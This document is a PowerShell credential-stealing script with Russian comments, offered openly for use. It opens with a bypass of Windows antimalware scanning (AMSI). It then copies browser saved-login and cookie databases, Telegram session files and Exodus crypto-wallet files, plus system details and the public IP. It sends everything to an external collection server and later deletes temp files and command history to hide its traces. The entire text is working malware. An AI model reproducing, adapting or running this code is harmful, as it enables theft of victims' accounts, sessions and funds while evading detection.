# Быстрый AMSI-байпас (2026 версия, часто работает)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

function Get-QuickSteal {
    $result = @{}

    # Браузеры (Chrome/Edge/Opera/Brave)
    $browserPaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default",
        "$env:APPDATA\Opera Software\Opera Stable"
    )

    foreach ($path in $browserPaths) {
        if (Test-Path "$path\Login Data") {
            $name = $path.Split('\')[-3]
            $result["logins_$name"] = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$path\Login Data"))
        }
        if (Test-Path "$path\Cookies") {
            $name = $path.Split('\')[-3]
            $result["cookies_$name"] = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$path\Cookies"))
        }
    }

    # Telegram tdata (самые жирные сессии)
    $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
    if (Test-Path $tgPath) {
        Get-ChildItem $tgPath -Recurse -File | Where-Object {$_.Length -gt 200 -and $_.Length -lt 1048576} | ForEach-Object {
            $result["tg_$($_.Name)"] = [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))
        }
    }

    # MetaMask и подобные
    $exodus = "$env:APPDATA\Exodus"
    if (Test-Path $exodus) {
        Get-ChildItem $exodus -Recurse -Include *.json,*.dat -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Length -lt 5242880) { $result["exodus_$($_.Name)"] = [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)) }
        }
    }

    # Системная информация
    $info = @{
        user   = $env:USERNAME
        pc     = $env:COMPUTERNAME
        os     = (Get-CimInstance Win32_OperatingSystem).Caption
        ip     = try {(irm http://api.ipify.org -TimeoutSec 6)} catch {"error"}
        time   = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
    $result["sys"] = $info | ConvertTo-Json -Compress

    return $result | ConvertTo-Json -Compress
}

$data = Get-QuickSteal

# Отправка на твой Python-сервер
$uri = "https://serv-production-40e7.up.railway.app/receive"   # ← замени на свой URL
try {
    Invoke-WebRequest -Uri $uri -Method POST -Body $data -ContentType "application/json" -TimeoutSec 12
} catch {}

# Ждём 1 час и удаляем следы
Start-Sleep -Seconds 3600

# Самоуничтожение
Remove-Item $env:TEMP\*.ps* -Force -ErrorAction SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
[Environment]::Exit(0)
